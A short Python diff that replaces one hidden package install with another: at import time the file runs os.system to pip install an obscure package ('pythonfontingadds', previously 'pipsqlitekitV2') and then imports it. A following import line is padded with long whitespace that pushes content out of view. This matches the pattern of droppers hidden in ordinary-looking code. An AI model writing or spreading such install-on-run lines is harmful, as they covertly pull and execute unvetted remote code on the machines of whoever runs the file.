@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitekitV2")
-import pipsqlitekitV2
+os.system("pip install pythonfontingadds")
+import pythonfontingadds
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
